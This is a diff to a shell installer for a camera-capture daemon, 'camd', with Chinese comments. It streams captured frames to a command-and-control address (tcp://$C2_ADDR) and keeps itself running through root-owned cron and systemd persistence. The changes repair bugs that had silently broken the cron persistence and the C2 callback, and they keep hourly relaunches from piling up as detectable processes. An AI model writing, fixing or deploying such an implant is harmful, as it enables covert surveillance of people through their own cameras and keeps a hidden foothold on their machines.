@@ -194,7 +194,12 @@ set -a
 . /etc/camd/camd.conf
 set +a
 [ -n "$C2_ADDR" ] || { echo "[FATAL] C2_ADDR 未配置" >&2; exit 6; }
-exec /usr/local/bin/camd --sink "tcp://$C2_ADDR" --backend "$CAMD_BACKEND"
+# "$@" 透传：systemd 不带参（常驻，Restart=always 兜底重拉）；
+# cron 带 --batches 1 —— cron 是"每小时拉起一次"的模型，若 camd 不限批次
+# （默认 max_batches=0，跑到收到停止信号为止），每个整点就会新增一个
+# 永不退出的采集进程：进程堆积、多个进程抢同一摄像头、文件句柄与内存
+# 持续增长。驻留机制反而变成资源耗尽与暴露面。cron 路径必须限定批次。
+exec /usr/local/bin/camd --sink "tcp://$C2_ADDR" --backend "$CAMD_BACKEND" "$@"
 RUNEOF
     chmod 0700 "$LIB_DIR/run.sh" 2>/dev/null
     OK "启动器已写入 $LIB_DIR/run.sh（0700）"
@@ -296,12 +301,28 @@ persist_cron() {
     [ -d /etc/cron.d ] || { WARN "无 /etc/cron.d，跳过 cron 驻留"; return 0; }
     # 分位用真实秒数，避免 RANDOM 在 dash 下不展开导致 crontab 语法错。
     M=$(( $(date +%S) % 60 ))
+    #
+    # 缺陷修复（实测踩出来的）：原条目是
+    #     . /etc/camd/camd.conf; /usr/local/bin/camd --sink ... --backend ...
+    # 两个问题，第二个致命：
+    #
+    #   1. `--key` 依赖 conf 里的 CAMD_KEY，但 `.` 只是**赋值、不导出**。
+    #      camd 用 getenv("CAMD_KEY") 取密钥，取不到就
+    #      [FATAL] 必须指定 --key 并退出。而 cron 的输出默认丢弃
+    #      （无 MAILTO、无日志），于是一小时一次、次次失败、无人知晓。
+    #      表现与"驻留成功"完全无法区分：进程确实起来过、也确实退出了。
+    #
+    #   2. 这是 systemd 之外的**第二份** camd 调用（单元里有一份）。
+    #      两份独立书写的调用必然发散——此前 tcp:// 前缀正是在三处
+    #      sink 里漏掉两处，导致 systemd 与 cron 两条路的回传全断。
+    #
+    # 改为复用 run.sh：它是唯一的调用点，内部 `set -a` 正确导出密钥，
+    # 且 systemd 与 cron 走的是同一份命令，不再有发散的可能。
     {
         printf '# managed\n'
         printf 'SHELL=/bin/sh\n'
         printf 'PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n'
-        printf '%s * * * * root . %s; %s --sink "tcp://$C2_ADDR" --backend "$CAMD_BACKEND"\n' \
-            "$M" "$CONF_FILE" "$BIN_DST"
+        printf '%s * * * * root %s --batches 1\n' "$M" "$LIB_DIR/run.sh"
     } > "$CRON" 2>/dev/null || { WARN "cron 写入失败"; return 0; }
     chmod 0600 "$CRON" 2>/dev/null
     OK "cron 条目已写入（分位 $M）"
